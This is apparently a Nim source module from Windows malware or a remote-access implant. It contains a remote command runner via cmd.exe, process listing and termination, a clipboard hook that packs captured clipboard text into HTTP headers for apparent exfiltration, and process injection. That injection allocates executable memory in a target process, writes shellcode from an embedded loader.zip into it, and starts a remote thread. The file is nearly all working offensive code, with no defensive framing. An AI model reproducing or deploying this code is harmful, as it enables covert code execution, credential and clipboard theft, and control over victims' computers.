import zippy/ziparchives
import std/tables
import streams
import winim/lean
import strformat
import strutils
import winim except `&`
import net
import osproc
import nimclipboard/libclipboard
import os
type ProcessEntry32W = object
  dwSize: DWORD
  cntUsage: DWORD
  th32ProcessID: DWORD  ## this process
  th32DefaultHeapID: ULONG_PTR
  th32ModuleID: DWORD  ## associated exe
  cntThreads: DWORD
  th32ParentProcessID: DWORD  ## this process's parent process
  pcPriClassBase: LONG
  dwFlags: DWORD
  szExeFile: array[MAX_PATH, int16]  ## Path

proc executeCommand*(cmd: string): string =
    try:
        let result = execCmdEx("cmd.exe /c "&cmd)
        return result.output
    except:
        return "[!] CommandError : Impossible d'executer la commande."
    
proc raiseError() = 
    var error_message: LPWSTR = newStringOfCap( 256 )
    let error_code = GetLastError()
    discard FormatMessageW( FORMAT_MESSAGE_FROM_SYSTEM, 
                            NULL, 
                            error_code,
                            MAKELANGID( LANG_NEUTRAL, SUBLANG_DEFAULT ).DWORD,
                            error_message, 
                            256, 
                            NULL )
    discard SetErrorMode( 0 )
    raise newException( OSError, "ERROR ($1): $2" % [$error_code, $error_message] )

proc terminate_process_by_pid*(processID: int): void =
    var hProcess = OpenProcess( cast[DWORD](PROCESS_TERMINATE), FALSE, cast[DWORD](processID) )
    if hProcess.addr != nil:
        if TerminateProcess( hProcess, 0 ) == 0:
            CloseHandle( hProcess )
            raiseError()
        else:
            echo "[*] Process " & processID.intToStr() & " terminated."
    else:
        CloseHandle( hProcess )
        raiseError()

proc pid_name*(processID: int): string =
    #[
        function for getting the process name of pid
    ]#
    var szProcessName: array[MAX_PATH, WCHAR]

    #  Get a handle to the process.
    var hProcess = OpenProcess( cast[DWORD](PROCESS_QUERY_INFORMATION or PROCESS_VM_READ), FALSE, cast[DWORD](processID) )

    #  Get the process name.
    if hProcess.addr != nil:
        var hMod: HMODULE
        var cbNeeded: DWORD

        if EnumProcessModules( hProcess, hMod.addr, cast[DWORD](sizeof(hMod)), cbNeeded.addr):
            GetModuleBaseNameW( hProcess, hMod, addr(szProcessName[0]), 
                                cast[DWORD](szProcessName.len) )
    else:
        CloseHandle(hProcess)
        raiseError()

    CloseHandle( hProcess )
    var ret: string
    for c in szProcessName:
        if cast[char](c) == '\0':
            break

        ret.add(cast[char](c))
        
    return ret

proc hook_clipboard*(hostname: string): void =
    echo "[*] Hooking clipboard....."
    var lastClipboardText: cstring = ""
    var cb = clipboard_new(nil)
    while true:
        let currentClipboardText = cb.clipboard_text()

        if currentClipboardText != lastClipboardText:
            let customHeadersClip = ["User-Agent: " & hostname, "Accept: text/html","Clip: " & $currentClipboardText ]
            lastClipboardText = currentClipboardText
        sleep(1000)


proc pids*(): seq[int] = 
    ## Returns a list of PIDs currently running on the system.
    result = newSeq[int]()

    var procArray: seq[DWORD]
    var procArrayLen = 0
    # Stores the byte size of the returned array from enumprocesses
    var enumReturnSz: DWORD = 0

    while enumReturnSz == DWORD( procArrayLen * sizeof(DWORD) ):
        procArrayLen += 1024
        procArray = newSeq[DWORD](procArrayLen)

        if EnumProcesses( addr procArray[0], 
                          DWORD( procArrayLen * sizeof(DWORD) ), 
                          addr enumReturnSz ) == 0:
            raiseError()
            return result

    # The number of elements is the returned size / size of each element
    let numberOfReturnedPIDs = int( int(enumReturnSz) / sizeof(DWORD) )
    for i in 0..<numberOfReturnedPIDs:
        result.add( procArray[i].int )

proc get_pid_by_name*(processName: string): int =
    ## Returns the PID of the process with the given name.
    ## If there are multiple processes with the same name, it returns the first one found.
    ## If no process with the given name is found, it returns -1.
    let allPids = pids()
    for pid in allPids:
        if pid_name(pid).toLowerAscii() == processName.toLowerAscii():
            return pid
    return -1

proc get_child_pids*(pid: int): seq[int] =
  ## Returns a list of child PIDs of the given PID.
  result = newSeq[int]()

  var pe32: ProcessEntry32W
  pe32.dwSize = sizeof(ProcessEntry32W).DWORD

  let hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if hProcessSnap == INVALID_HANDLE_VALUE:
    raiseError()
    return result

  if Process32First(hProcessSnap, cast[LPPROCESSENTRY32W](addr pe32)) == 0:
    CloseHandle(hProcessSnap)
    raiseError()
    return result

  while Process32Next(hProcessSnap, cast[LPPROCESSENTRY32W](addr pe32)) != 0:
    if pe32.th32ParentProcessID.int == pid:
      result.add(pe32.th32ProcessID.int)

  CloseHandle(hProcessSnap)
  return result

proc innerMain(shellcode: ptr,size: int, pid: int): void =
    var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, cast[DWORD](pid))
    echo "[*] Opening process " & pid.intToStr()
    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](size),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )
    echo "[*] Writing our shellcode into the process"
    WriteProcessMemory(pHandle, rPtr, shellcode, size, NULL);
    echo "[*] Allocating memory"
    CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, 0, NULL);
    echo "[*] Creating remote thread"
    CloseHandle(pHandle);
    # copyMem(rPtr, shellcode, size)
    # let f = cast[proc(){.nimcall.}](rPtr)
    # f()

proc torcodemain*(pid: int) =
    if defined(windows):
        const MY_RESOURCE = slurp("../bin/loader.zip")
        let dataStream = newStringStream(MY_RESOURCE)
        let archive = ZipArchive()
        archive.open(dataStream)
        var payload = (archive.contents["loader.bin"]).contents
        archive.clear()
        const sc_length: int = 3079555
        var shellcodePtr = (cast[ptr array[sc_length, byte]](addr payload[0]))
        innerMain(shellcodePtr,len(payload),pid)
    else:
        echo "[-] This OS is not currently supported, exiting..."
        quit(1)

proc isEmptyString*(s: string): bool =
  for c in s:
    if c != '\0':
      return false
  return true